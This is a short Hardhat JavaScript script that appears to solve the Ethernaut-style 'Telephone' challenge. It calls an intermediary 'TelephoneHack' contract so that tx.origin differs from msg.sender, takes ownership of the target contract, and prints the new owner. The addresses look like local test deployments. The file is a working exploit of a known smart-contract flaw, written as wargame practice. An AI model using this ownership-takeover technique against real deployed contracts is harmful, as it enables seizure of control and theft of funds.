import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // telephone contract address
    let address_a = "0x5FC8d32690cc91D4c39d9d3abcBD16989F875707";
    // proxy telephone contract address
    let address_b = "0x0165878A594ca255338adfa4d48449f69242Eb8F";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Telephone", address_a, signer);
    let contract_b = await ethers.getContractAt("TelephoneHack",address_b, signer);

    // using another smart contract to call the other contract to achieve tx.orgin != msg.sender
    await contract_b.hack();

    // check we are indeed owner
    let owner = await contract_a.owner();
    console.log(owner);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
